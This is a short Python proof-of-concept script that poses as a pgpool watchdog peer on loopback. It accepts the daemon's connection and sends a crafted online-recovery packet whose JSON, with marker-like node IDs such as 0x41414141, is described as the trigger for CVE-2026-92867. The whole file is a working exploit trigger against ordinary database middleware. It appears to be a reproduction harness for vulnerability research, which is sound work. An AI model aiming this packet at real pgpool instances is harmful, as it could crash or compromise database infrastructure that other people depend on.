#!/usr/bin/env python3
"""Minimal synthetic pgpool watchdog peer: listen, accept pgpool's outbound
connection, then send one WD_IPC_ONLINE_RECOVERY_COMMAND ('r') packet whose
data is the CVE-2026-92867 trigger JSON. Loopback only."""
import socket, struct, sys, time

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 19005
JSON = sys.argv[2] if len(sys.argv) > 2 else (
    '{"Function":"START_RECOVERY","Flags":0,"NodeCount":2,'
    '"NodeIdList":[1094795585,1111638594]}'
)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("127.0.0.1", PORT))
s.listen(1)
print(f"peer listening 127.0.0.1:{PORT}", flush=True)
conn, addr = s.accept()
print(f"peer accepted {addr}", flush=True)

# Drain whatever the daemon sends during connect, briefly.
conn.settimeout(1.0)
try:
    while True:
        data = conn.recv(4096)
        if not data:
            break
        print(f"peer recv {len(data)} bytes type={data[:1]!r}", flush=True)
except socket.timeout:
    pass

pkt = b'r' + struct.pack("!II", 1, len(JSON)) + JSON.encode()
print(f"peer sending type=r len={len(JSON)} payload={JSON}", flush=True)
conn.sendall(pkt)
conn.settimeout(3.0)
try:
    while True:
        data = conn.recv(4096)
        if not data:
            print("peer: connection closed by daemon", flush=True)
            break
        print(f"peer recv after send {len(data)} bytes type={data[:1]!r}", flush=True)
except socket.timeout:
    print("peer: 3s idle after send (daemon still alive)", flush=True)
conn.close()
s.close()
